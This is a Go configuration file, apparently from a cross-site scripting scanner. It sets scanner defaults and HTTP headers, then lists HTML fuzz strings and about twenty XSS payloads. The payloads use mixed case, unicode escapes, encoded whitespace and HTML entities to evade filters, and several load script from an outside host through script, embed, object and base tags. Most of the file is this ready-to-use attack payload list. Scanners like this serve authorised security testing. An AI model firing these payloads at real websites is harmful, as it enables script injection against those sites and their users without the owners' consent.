package config

const (
	XSSChecker         = "v3dm0s"
	DefaultDelay       = 0
	DefaultThreadCount = 10
	DefaultTimeout     = 10
)

var DefaultHeaders = map[string]string{
	"User-Agent":                "$",
	"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"Accept-Language":           "en-US,en;q=0.5",
	"Accept-Encoding":           "gzip,deflate",
	"Connection":                "close",
	"DNT":                       "1",
	"Upgrade-Insecure-Requests": "1",
}

var DefaultFuzzes = []string{
	"<test",
	"<test//",
	"<test>",
	"<test x>",
	"<test x=y",
	"<test x=y//",
	"<test/oNxX=yYy//",
	"<test oNxX=yYy>",
	"<test onload=x",
	"<test/o%00nload=x",
	"<test sRc=xxx",
	"<test data=asa",
	"<test data=javascript:asa",
	"<svg x=y>",
	"<details x=y//",
	"<a href=x//",
	"<emBed x=y>",
	"<object x=y//",
	"<bGsOund sRc=x>",
	"<iSinDEx x=y//",
	"<aUdio x=y>",
	"<script x=y>",
	"<script//src=//",
	"\">payload<br/attr=\"",
	"\"-confirm``-\"",
	"<test ONdBlcLicK=x>",
	"<test/oNcoNTeXtMenU=x>",
	"<test OndRAgOvEr=x>",
}

var DefaultPayloads = []string{
	"'\"</Script><Html Onmouseover=(confirm)()//",
	"<imG/sRc=l oNerrOr=(prompt)() x>",
	"<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>",
	"<deTails open oNToggle=confi\u0072m()>",
	"<img sRc=l oNerrOr=(confirm)() x>",
	"<svg/x=\">\"/onload=confirm()//",
	"<svg%0Aonload=%09((pro\u006dpt))()//",
	"<iMg sRc=x:confirm`` oNlOad=e\u0076al(src)>",
	"<sCript x>confirm``</scRipt x>",
	"<Script x>prompt()</scRiPt x>",
	"<sCriPt sRc=//14.rs>",
	"<embed//sRc=//14.rs>",
	"<base href=//14.rs/><script src=/>",
	"<object//data=//14.rs>",
	"<s=\" onclick=confirm``>clickme",
	"<svG oNLoad=co\u006efirm&#x28;1&#x29>",
	"'\"><y///oNMousEDown=((confirm))()>Click",
	"<a/href=javascript&colon;co\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>",
	"<img src=x onerror=confir\u006d`1`>",
	"<svg/onload=co\u006efir\u006d`1`>",
}
